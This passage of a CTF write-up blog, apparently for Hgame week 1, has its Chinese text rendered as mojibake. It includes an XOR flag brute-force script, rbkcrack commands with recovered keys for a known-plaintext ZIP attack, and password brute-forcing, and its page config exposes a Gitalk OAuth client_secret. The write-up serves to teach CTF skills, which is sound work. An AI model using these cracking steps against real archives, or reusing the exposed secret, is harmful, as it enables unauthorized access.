<p>è€Œä¸”æ˜æ–‡è§„å®šäº†åªæœ‰ï¼š<code>charset = string.ascii_letters+string.digits</code>ï¼Œé‚£ä¹ˆåªè¦æ ·æœ¬æ•°æ®å’Œçˆ†ç ´çš„flagå¼‚æˆ–ï¼Œå¦‚æœç»“æœéƒ½æ˜¯charsetèŒƒå›´å†…çš„å­—ç¬¦è¯æ˜flagæœ‰å¯èƒ½æ˜¯æ­£ç¡®çš„ï¼Œåªè¦æœé›†å¤Ÿå¤šçš„æ ·æœ¬ï¼Œé‚£ä¹ˆå¯èƒ½çš„flagå°±è¶Šå°‘ã€‚</p>
<p>ç”¨åˆ°çš„è„šæœ¬å¦‚ä¸‹ï¼š</p>
<p>æ”¶é›†ä¸€æ¡æ•°æ®ç”¨çš„è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">import</span> base64

data <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

decode_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span> decode_bytes<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨æ³•ï¼š<code>nc 47.98.192.231 25001 | python2 get_sample.py &gt;&gt; samples.txt</code></p>
<p>ä¿å­˜æ•°æ®åœ¨samples.txtæ–‡ä»¶é‡Œï¼Œè¿è¡Œå¤šæ¬¡ä¸Šè¿°å‘½ä»¤ï¼Œå¤§æ¦‚æœé›†å¤Ÿ50æ¡æ•°æ®å°±å¤Ÿäº†</p>
<p>ç„¶åï¼Œç”¨è¿™äº›æ•°æ®è¿›è¡Œçˆ†ç ´çš„flagçš„éªŒè¯ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> string
<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits <span class="token comment"># è¢«åŠ å¯†çš„æ–‡æœ¬çš„å­—ç¬¦é›†</span>

<span class="token keyword">def</span> <span class="token function">load_sample</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
        samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> fd<span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
            samples<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> samples

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>samples<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""æ ·æœ¬æ•°æ®ä¸flagå¼‚æˆ–æ¥éªŒè¯"""</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> samples<span class="token punctuation">:</span>
        ret <span class="token operator">=</span> xor<span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span> 
        <span class="token keyword">if</span> ret <span class="token keyword">not</span> <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

flag_len <span class="token operator">=</span> <span class="token number">42</span> <span class="token comment"># flagé•¿åº¦æ˜¯43 æœ€åä¸€ä¸ªæ˜¯ &#125;</span>
q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'hgame&#123;'</span><span class="token punctuation">)</span>
samples <span class="token operator">=</span> load_sample<span class="token punctuation">(</span><span class="token string">'./samples.txt'</span><span class="token punctuation">)</span> <span class="token comment"># æ•°æ®å­˜æ”¾åœ¨samples.txtæ–‡ä»¶</span>

<span class="token comment">#print(samples)</span>
<span class="token comment">#assert False</span>

count <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment"># çˆ†ç ´flag, å¯†æ–‡è¦è¶³å¤Ÿå¤š</span>
<span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
    count <span class="token operator">-=</span> <span class="token number">1</span>
    next_index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        <span class="token keyword">if</span> validate<span class="token punctuation">(</span>samples<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> next_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
            new_flag <span class="token operator">=</span> flag <span class="token operator">+</span> ch
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>new_flag<span class="token punctuation">)</span> <span class="token operator">==</span> flag_len<span class="token punctuation">:</span>
                <span class="token keyword">print</span> new_flag <span class="token operator">+</span> <span class="token string">'&#125;'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token comment">#print('now: %s' % new_flag)</span>
                q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>new_flag<span class="token punctuation">)</span>
                count <span class="token operator">+=</span> <span class="token number">1</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'count: %d'</span> <span class="token operator">%</span> count<span class="token punctuation">)</span> <span class="token comment"># æ˜¾ç¤ºå‡ºå¯èƒ½çš„ç»“æœæ•°ï¼Œå¦‚æœå¤ªå¤šå°±å†å¤šæ”¶é›†ç‚¹å¯†æ–‡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>ä¸€å¼€å§‹æŠŠé¢˜ç›®çœ‹é”™æˆRecoderï¼Œç¬é—´æ‡µäº†ï¼Œç„¶åæ‰å‘ç°å…¶å®å°±æ˜¯æ‰“ä¹±äº†flagçš„é¡ºåºã€‚</p>
<p>ç›´æ¥ä¸Šåšé¢˜è¿‡ç¨‹å›¾ï¼ˆå˜»å˜»ï¼Œåˆšå¥½è¿™é¢˜ç•™äº†å›¾ï¼Œå†ä¹Ÿä¸æ•¢ä¸ç•™å›¾äº†T_Tï¼‰</p>
<p><img src="/images/20ebc87d/crypto-4-1.png" alt="1"></p>
<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h3><p>ç™¾åº¦å‘ç°è¦base64è§£ç ï¼Œè§£ç åæ˜¯æ‘©æ–¯ç”µç ï¼š</p>
<p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p>
<p>ç„¶åå»æ‰¾ä¸ªæ‘©æ–¯ç”µç åœ¨çº¿è§£å¯†çš„ç½‘ç«™è§£å¯†å³å¯ï¼Œè¦æ³¨æ„çš„æ˜¯æˆ‘æ‰¾åˆ°çš„å¤§éƒ¨åˆ†ç½‘ç«™çš„æ‘©æ–¯ç”µç çš„åˆ†éš”ç¬¦éƒ½æ˜¯<code>/</code>ï¼Œè€Œè¿™é‡Œæ˜¯ç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘è¿˜æŠŠå…¨éƒ¨ç©ºæ ¼æ¢æˆäº†<code>/</code>æ‰æˆåŠŸè§£å¯†</p>
<h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><p>å‹ç¼©åŒ…è§£å‹åæ˜¯å¼ å›¾ç‰‡ï¼Œkaliä¸Šç”¨binwalkæŸ¥çœ‹å‘ç°å›¾ç‰‡é‡Œéšè—äº†å‹ç¼©åŒ…ï¼Œä¸”æç¤ºè§£å‹å¯†ç æ˜¯å›¾ç‰‡IDï¼š</p>
<p><img src="/images/20ebc87d/misc-2-1.png" alt="1"></p>
<p>åˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼š</p>
<p><img src="/images/20ebc87d/misc-2-2.png" alt="2"></p>
<p>è§£å‹å‹ç¼©åŒ…ï¼Œå¯†ç æ˜¯å›¾ç‰‡IDï¼Œè¿™ä¸ªIDæ˜¯Pç«™ä¸Šçš„å¯¹åº”çš„è¿™å¼ å›¾çš„IDï¼ˆæˆ‘ä¸€ä¸ªä¸æ‡‚äºŒæ¬¡å…ƒçš„ç¡¬ç”Ÿç”Ÿä»ç™¾åº¦è¯†å›¾ä¸€ç›´æŒ–åˆ°Pç«™ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸æ€ä¹ˆæ‡‚è¿™ä¸ªPç«™æ˜¯ä»€ä¹ˆä¸œä¸œï¼Œåªæ˜¯å¬è¯´è¿‡ï¼‰ï¼Œè§£å‹åè·å¾—ä¸€ä¸ªflag.txtæ–‡ä»¶ï¼š</p>
<p><img src="/images/20ebc87d/misc-2-3.png" alt="3"></p>
<p>çœ‹æ ·å­æ˜¯unicodeç¼–ç ï¼Œå…¶å®ç›´æ¥å½“16è¿›åˆ¶ç¼–ç å¤„ç†å°±å¥½äº†ï¼Œpythonå¤„ç†ä¸€ä¸‹å°±å¥½ï¼š</p>
<p><img src="/images/20ebc87d/misc-2-4.png" alt="4"></p>
<hr>
<h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><p>è§£å‹å‹ç¼©åŒ…åï¼Œæœ‰æ–‡æœ¬æ–‡ä»¶Bacon.txtå’Œå‹ç¼©åŒ…Novel.zipï¼Œå‹ç¼©åŒ…æœ‰å¯†ç ã€‚ç„¶åè¿™ä¸ªå‹ç¼©åŒ…é‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å«Bacon.txtï¼ŒæŠŠBacon.txtè¿™ä¸ªæ–‡æœ¬æ–‡ä»¶å•ç‹¬å‹ç¼©ï¼Œå‘ç°æ ¡éªŒç å’ŒNovel.zipé‡Œçš„Bacon.txtæ–‡ä»¶çš„ä¸€æ ·ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šæ˜¯ä¸€æ ·çš„æ–‡ä»¶ï¼ŒæŸ¥èµ„æ–™å‘ç°å¯ä»¥ä½¿ç”¨æ˜æ–‡æ”»å‡»ï¼Œå¯ä»¥çˆ†ç ´å‡ºåŠ å¯†å¯†é’¥ï¼ˆä¸æ˜¯å¯†ç ï¼‰ã€‚</p>
<p>å¯ä»¥ç”¨<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Aloxaf/rbkcrack">rbkcrack</a>å·¥å…·æ¥ç ´è§£ï¼Œå®‰è£…æˆ‘å°±ä¸ç»†è¯´äº†ï¼Œç›´æ¥ç ´è§£ï¼š</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">rbkcrack<span class="token punctuation">.</span>exe <span class="token operator">-</span>C Novel<span class="token punctuation">.</span>zip <span class="token operator">-</span>c Bacon<span class="token punctuation">.</span>txt <span class="token operator">-</span>p Bacon<span class="token punctuation">.</span>txt <span class="token operator">-</span>P Bacon<span class="token punctuation">.</span>zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶ä¸­<code>-C Novel.zip</code>æ˜¯è¦ç ´è§£çš„å‹ç¼©åŒ…ï¼Œ<code>-c Bacon.txt</code>æ˜¯Novel.zipé‡Œé¢çš„å·²çŸ¥çš„é‚£ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œ<code>-p Bacon.txt</code>æ˜¯å·²çŸ¥çš„æ˜æ–‡æ–‡ä»¶ï¼Œ<code>-P Bacon.zip</code>æ˜¯å·²çŸ¥çš„Bacon.txtå‹ç¼©åçš„zipæ–‡ä»¶</p>
<p><img src="/images/20ebc87d/misc-3-1.png" alt="1"></p>
<p>å¾—åˆ°å¯†é’¥ï¼Œflagè‚¯å®šåœ¨å‹ç¼©åŒ…é‡Œçš„é‚£ä¸ª.docæ–‡ä»¶é‡Œå•¦ï¼Œè§£å¯†å‡ºæ¥</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">rbkcrack<span class="token punctuation">.</span>exe <span class="token operator">-</span>C Novel<span class="token punctuation">.</span>zip <span class="token operator">-</span>c <span class="token string">'The Call of Cthulhu.doc'</span> <span class="token operator">-</span>k 720b7516 d2d6a716 2c24dcae  <span class="token operator">-</span>u <span class="token operator">-</span>d xx<span class="token punctuation">.</span>doc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘ç°.docæ–‡ä»¶æ‰“å¼€éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆå¯†ç æ˜¯ä»Bacon.txté‡Œè§£åˆ°çš„ï¼ˆå…¶å®æˆ‘æ˜¯å…ˆè§£å‡ºäº†.docæ–‡ä»¶çš„å¯†ç ï¼Œæ‰æ¥ç ´è§£å‹ç¼©åŒ…çš„ï¼‰ï¼Œæ— æ„é—´ç¿»è¯‘äº†Baconè¿™ä¸ªå•è¯ï¼Œå‘ç°æœ‰â€åŸ¹æ ¹â€œçš„æ„æ€ï¼Œè€Œä¸”è¿˜æŸ¥åˆ°äº†åŸ¹æ ¹å¯†ç ï¼Œç„¶åBacon.txté‡Œçš„å†…å®¹æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="/images/20ebc87d/misc-3-2.png" alt="2"></p>
<p>ä¸€äº›æ˜¯å¤§å†™ï¼Œä¸€äº›æ˜¯å°å†™ï¼Œå¤§å†™å­—æ¯å½“ä½œaï¼Œå°å†™å­—æ¯å½“ä½œbï¼Œç©ºæ ¼æ ‡ç‚¹å»æ‰ï¼Œé‚£ä¹ˆå¾—åˆ°åŸ¹æ ¹å¯†ç ï¼š</p>
<p><img src="/images/20ebc87d/misc-3-3.png" alt="3"></p>
<p>æ‹¿å»æ‰¾åœ¨å…ˆç½‘ç«™è§£å¯†ï¼š</p>
<p><img src="/images/20ebc87d/misc-3-4.png" alt="4"></p>
<p>ç„¶åæ ¹æ®æç¤ºï¼Œå¤§å†™çš„é‚£ä¸€ä¸²å°±æ˜¯.docæ–‡ä»¶çš„å¯†ç ï¼Œæ‰“å¼€ååªæ˜¯ä¸€ç¯‡æ–‡ç« ï¼Œflagéšè—åœ¨.docæ–‡ä»¶é‡Œï¼Œæ‰“å¼€wordæ–‡æ¡£éšè—å­—ä½“çš„æ˜¾ç¤ºé€‰é¡¹å³å¯ã€‚å¤§æ¦‚æ–¹å¼ä¾æ¬¡ç‚¹å‡»ï¼š<code>æ–‡ä»¶-&gt;é€‰é¡¹-&gt;æ˜¾ç¤º-&gt;éšè—æ–‡å­—</code></p>
<p><img src="/images/20ebc87d/misc-3-5.png" alt="5"></p>
<p>flagåœ¨æ–‡æ¡£æœ€åº•éƒ¨ï¼š</p>
<p><img src="/images/20ebc87d/misc-3-6.png" alt="6"></p>
<hr>
<h3 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h3><p>æ ¹æ®æç¤º</p>
<p><img src="/images/20ebc87d/misc-4-1.png" alt="1"></p>
<p>æŠŠå‰ä¸‰è¡Œæ–‡å­—ï¼Œæ‰¾ä¸ªç½‘ç«™ç”¨æ …æ å¯†ç è§£å¯†ï¼Œæ¯ç»„æ•°å­—ä¸º3</p>
<p><img src="/images/20ebc87d/misc-4-2.png" alt="2"></p>
<p>ç„¶åå‡¯æ’’å¯†ç è§£å¯†ï¼Œåç§»ä¸º5</p>
<p><img src="/images/20ebc87d/misc-4-3.png" alt="3"></p>
<p>å¾—åˆ°å‹ç¼©åŒ…çš„è§£å¯†å¯†ç ï¼Œè§£å‹åè·å¾—ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼š</p>
<p><img src="/images/20ebc87d/misc-4-4.png" alt="4"></p>
<p>å¤åˆ¶äº†ä¸¤è¡Œå»æœç´¢ï¼Œå‘ç°æ˜¯Brainfuck/Ook!ç¼–ç ï¼Œåˆæ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™å»è§£ï¼š</p>
<p><img src="/images/20ebc87d/misc-4-5.png" alt="5"></p>
<p>çœ‹æ¥æ˜¯base32ç¼–ç ï¼Œè§£ç ï¼</p>
<p><img src="/images/20ebc87d/misc-4-6.png" alt="6"></p>
<p>è§£ç åï¼Œæœ€åé¢æœ‰ä¸¤ä¸ªç­‰å·ï¼Œçœ‹èµ·æ¥æ˜¯base64ç¼–ç ï¼ˆä¸€å¼€å§‹ç”¨base32ç»§ç»­è§£ç å‘ç°ä¸è¡Œï¼‰ï¼Œç„¶åå»base64è§£ç ï¼Œå‘ç°å¤§å¤šç½‘ç«™ä¸æ˜¯è¯´å­—ç¬¦è¿‡å¤šï¼Œå°±æ˜¯ç›´æ¥è§£ä¸å‡ºæ¥ï¼Œç„¶åç”¨pythonè§£</p>
<p><img src="/images/20ebc87d/misc-4-7.png" alt="7"></p>
<p>æˆªå–å‰50ä¸ªå­—èŠ‚çœ‹çœ‹ï¼Œå‘ç°æœ‰PNGå¤´ï¼Œé‚£ä¹ˆè¿™äº›æ•°æ®å°±æ˜¯ä¸€ä¸ªPNGå›¾åƒæ–‡ä»¶çš„æ•°æ®ï¼Œé‚£ä¹ˆä¿å­˜åˆ°ä¸€ä¸ª.pngæ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸ªäºŒç»´ç </p>
<p><img src="/images/20ebc87d/misc-4-8.png" alt="8"></p>
<p>æ‰«ç å¾—flagå“Ÿï¼</p>
<hr>
<h3 id="æ¯æ—¥æ¨è"><a href="#æ¯æ—¥æ¨è" class="headerlink" title="æ¯æ—¥æ¨è"></a>æ¯æ—¥æ¨è</h3><p>ä¸€ä¸ª.pcapngæ–‡ä»¶ï¼Œç”¨wiresharkåˆ†æï¼Œå‘ç°æœ‰å¾ˆå¤šhttpçš„åŒ…ï¼Œé‚£å°±ç­›é€‰httpçš„åŒ…å‡ºæ¥</p>
<p><img src="/images/20ebc87d/misc-5-1.png" alt="1"></p>
<p>é€ä¸ªæŸ¥çœ‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªhttpçš„è¯·æ±‚ï¼Œä¸Šä¼ äº†ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p><img src="/images/20ebc87d/misc-5-2.png" alt="2"></p>
<p>å¯¼å‡ºè¿™ä¸ªå‹ç¼©åŒ…ï¼Œä¿å­˜ä¸ºsong.zipï¼š</p>
<p><img src="/images/20ebc87d/misc-5-3.png" alt="3"></p>
<p>å‹ç¼©åŒ…æ˜¯æœ‰å¯†ç ä¿æŠ¤çš„ï¼Œç”¨äºŒè¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å¯å‘ç°æœ«å°¾æœ‰æç¤º</p>
<p><img src="/images/20ebc87d/misc-5-4.png" alt="4"></p>
<p>å¯†ç æ˜¯6ä½æ•°å­—ï¼Œé‚£ç›´æ¥çˆ†ç ´å¥½äº†ï¼Œç”¨ä»€ä¹ˆè½¯ä»¶å°±ä¸ç»†è¯´äº†ï¼Œçˆ†ç ´åè§£å‹åˆ°ä¸€ä¸ªMP3æ–‡ä»¶ï¼ˆè¿™é¦–æ­Œå¾ˆå¥½å¬ï¼ï¼‰</p>
<p>ç”¨Audacityè½¯ä»¶æ‰“å¼€æŸ¥çœ‹é¢‘è°±å›¾å¯å¾—flag</p>
<p><img src="/images/20ebc87d/misc-5-5.png" alt="5"></p>
<hr>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¬¬ä¸€å‘¨è‰°éš¾çš„æŠŠé¢˜ç›®éƒ½åšäº†</p>
<ul>
<li><p>webçš„cxkæ¸¸æˆå¾ˆå¥½ç©ï¼</p>
</li>
<li><p>reçœ‹æ±‡ç¼–å’Œåæ±‡ç¼–å¾ˆå¤´ç–¼</p>
</li>
<li><p>Pwnä¹ä¸€çœ¼ä¸€çœ‹ï¼Œæƒ³å¤æ‚äº†</p>
</li>
<li><p>Cryptoå­¦äº†ä¸å°‘ä¸œè¥¿ï¼ˆè™½ç„¶ä¸æ€ä¹ˆæ‡‚ï¼‰</p>
</li>
<li><p>miscè„‘æ´çœŸå¤§ï¼ï¼ï¼</p>
</li>
</ul>
<blockquote>
<p>â€ä¸é—®å‡ºé¢˜äººä¸çŸ¥é“ï¼Œä¸€é—®å°±çŸ¥é“è‡ªå·±çš„é—®é¢˜æœ‰å¤šå¼±æ™ºâ€œ</p>
</blockquote>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>åŸä½œè€…ï¼š </strong>feather
  </li>
  <li class="post-copyright-link">
      <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="http://www.xi4oyu.top/20ebc87d/" title="Hgame-week1-writeup">http://www.xi4oyu.top/20ebc87d/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>

          <div class="followme">
  <span>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¶å®ƒå‘å¸ƒæ¸ é“</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/writeup/" rel="tag"># writeup</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/7de72646/" rel="prev" title="2020å¹´å¯’å‡è®¡åˆ’">
                  <i class="fa fa-chevron-left"></i> 2020å¹´å¯’å‡è®¡åˆ’
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/1966f4b8/" rel="next" title="Hgame-week2-writeup">
                  Hgame-week2-writeup <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">feather</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">380k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">5:46</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>




  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"c3302770a52769b596b5510a55396c91"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
